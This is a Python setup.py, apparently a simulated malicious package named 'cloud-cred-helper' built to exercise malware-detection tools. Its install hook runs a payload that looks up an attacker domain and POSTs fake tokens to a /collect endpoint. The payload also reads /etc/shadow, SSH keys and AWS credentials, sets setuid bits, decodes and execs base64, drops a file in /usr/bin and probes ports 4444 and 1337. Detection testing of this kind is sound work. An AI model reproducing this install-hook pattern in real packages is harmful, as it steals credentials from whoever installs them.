# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, base64, ctypes, mmap, time
from setuptools import setup
from setuptools.command.install import install

MALICIOUS_DOMAIN = "osbase.3zavlore.surf"
PORTS = [4444, 1337, 6667]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # HTTP POST
    try:
        subprocess.run(["curl","-sS","-m","3","-X","POST",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: cloud-cred-helper/1.0",
            "--data", f'{{"package":"cloud-cred-helper","token":"Authorization: Bearer stolen-token","secret":"BEGIN PRIVATE KEY fake","domain":"{MALICIOUS_DOMAIN}","credentials":".aws/credentials","password":"leaked-pass"}}',
            "http://127.0.0.1:8080/collect"], capture_output=True, timeout=6)
    except: pass

    # /etc access — 7 files
    for p in ["/etc/passwd","/etc/hosts","/etc/hostname","/etc/resolv.conf",
              "/etc/os-release","/etc/group","/etc/shadow"]:
        try_open(p)
    for p in ["/root/.ssh/id_rsa","/root/.aws/credentials","/root/.bash_history","/root/.profile"]:
        try_open(p)

    for i in range(55):
        p = f"/tmp/cloud_cred_helper_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p,p+".renamed"); os.unlink(p+".renamed")
        except: pass

    # priv=T — chmod only (no chown)
    try: subprocess.run(["chmod","777","/tmp/cloud_cred_helper_target"],capture_output=True)
    except: pass
    try: subprocess.run(["chmod","u+s","/tmp/cloud_cred_helper_target"],capture_output=True)
    except: pass
    try: subprocess.run(["/bin/sh","-c","echo shell-test; whoami; id"],capture_output=True)
    except: pass

    # obfuscation — base64 only (no eval/compile)
    try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
    except: pass

    # NO process injection (no ctypes ptrace, no mmap exec)

    # persistence — profile only (no crontab, no bashrc)
    try: open("/tmp/.profile_probe","a").write("persistence\n")
    except: pass

    # write_binary=T
    try:
        subprocess.run(["/bin/sh","-c",
            "exec 3>/usr/bin/cloud_cred_helper_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8,capture_output=True)
    except: pass

    # spawned=T — 11 procs
    procs = []
    for i in range(11):
        try: procs.append(subprocess.Popen(["/bin/sh","-c","echo process-op; id; sleep 20"],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL))
        except: pass

    for port in PORTS:
        connect_attempt("127.0.0.1",port)
        connect_attempt("1.1.1.1",port)

    time.sleep(46)
    for p in procs:
        try: p.kill()
        except: pass

class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="cloud-cred-helper",
    version="2.0.0",
    description="Cloud credential management and rotation helper",
    packages=["cloud_cred_helper"],
    cmdclass={"install": PostInstall},
)
